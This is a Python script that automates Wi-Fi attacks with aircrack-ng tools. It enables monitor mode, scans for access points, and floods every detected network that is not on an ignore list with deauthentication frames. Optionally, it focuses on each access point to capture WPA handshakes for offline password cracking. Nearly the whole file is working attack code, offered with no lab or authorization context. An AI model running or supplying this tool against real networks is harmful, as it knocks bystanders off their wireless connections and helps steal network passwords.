import subprocess
import re
import argparse
import os.path
from threading import Thread

def get_interface():
	data = subprocess.Popen(['airmon-ng'], stdout = subprocess.PIPE)
	output = data.communicate()[0].decode()
	try:
		return output.split('\n\n')[1].split('\t')[1]
	except:
		print('[-] No Interface Found!')
		exit()

def skip_client_by_name_or_bssid(skip_clients, line):
	for client in skip_clients:
		if client.lower() in line.lower():
			return True
	return False

"""def filename_available():
	filename = '1'
	while (os.path.exists(filename)):
		filename = str(int(filename) + 1)
	return filename"""

def check_for_creds_found(focus_AP, bssid):
	try:
		for line in focus_AP.stdout:
			if 'WPA handshake'.lower() in line.decode().lower():
				print('[***] Credentials with BSSID ' + bssid + 'Found')
				focus_AP.terminate()
				break
	except KeyboardInterrupt:
		print('Stopping Focussed Access Points')
		focus_AP.terminate()

def creds_and_deauth_handler(interface, line, skip_clients, capture_creds):
	bssid = re.findall(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', line)
	if len(bssid) == 1:
		bssid = bssid[0]
		# bssid is not already being deauthenticated
		if (bssid not in list_of_client_bssid): #and (bssid not in skip_clients):
			# name of wifi in skip_clients list
			if skip_client_by_name_or_bssid(skip_clients, line) == False:
				# Get hashed Credentials
				if capture_creds:
					# Focus on One Access Point (if creds are NOT already found)
					if (bssid not in creds_already_found_or_finding):
						creds_already_found_or_finding.append(bssid)
						filename = bssid
						try:
							channel = re.findall(r'(?:\w\w:\w\w:\w\w:\w\w:\w\w:\w\w\s+\-\d+\s+\d+\s+\d+\s+\d+\s+)(\d+)(?:\s+)', line)[0]
						except:
							return
						focus_AP = subprocess.Popen(['airodump-ng', '--bssid', bssid, '-c', channel, '--write', filename, interface], stdout = subprocess.PIPE)

						t1 = Thread(target=check_for_creds_found, args=(focus_AP, bssid))
						t1.start()
				list_of_client_bssid.append(bssid)
				t2 = Thread(target=deauth, args=(bssid, interface))
				t2.start()
				print(f'[+] Deauthenticating with BSSID {bssid}')

def capture_traffic(interface, skip_clients, capture_creds):
	global list_of_client_bssid, creds_already_found_or_finding
	list_of_client_bssid = []
	creds_already_found_or_finding = []

	# Popen() runs continously and does NOT block codes that follows it
	# terminate() is used to stop Popen()
	traffic = subprocess.Popen(['airodump-ng', interface], stdout = subprocess.PIPE)
	try:
		for line in traffic.stdout:
			line = line.decode()
			creds_and_deauth_handler(interface, line, skip_clients, capture_creds)
	except KeyboardInterrupt:
		print("Stopping Deauthentication..")
		traffic.terminate()
		print("Stopping Monitor Mode..")
		subprocess.call(['airmon-ng', 'stop', interface], stdout=subprocess.DEVNULL)

def deauth(bssid, interface):
	subprocess.call(['aireplay-ng', '--deauth', '100', '-a', bssid, interface], stdout=subprocess.DEVNULL)
	list_of_client_bssid.remove(bssid)

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-ig', '--ignore', help='Name of Wifi or BSSID to ignore')
	parser.add_argument('-c', '--cred', help='Capture Credentials is Set to TRUE')
	args = parser.parse_args()
	capture_creds = args.cred

	skip_clients = []

	for client in args.ignore.split(','):
		skip_clients.append(client)

	interface = get_interface()

	# Kill 2 process that could cause problem
	# Call() BLOCKS code that follows it until it is completed
	print("Killing 2 processes..")
	subprocess.call(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)

	print("Starting Monitor Mode..")
	# Monitor Mode
	subprocess.call(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL)

	# Capture Traffic
	print("Starting Deauthentication..")
	capture_traffic(interface, skip_clients, capture_creds)

if __name__ == '__main__':
	main()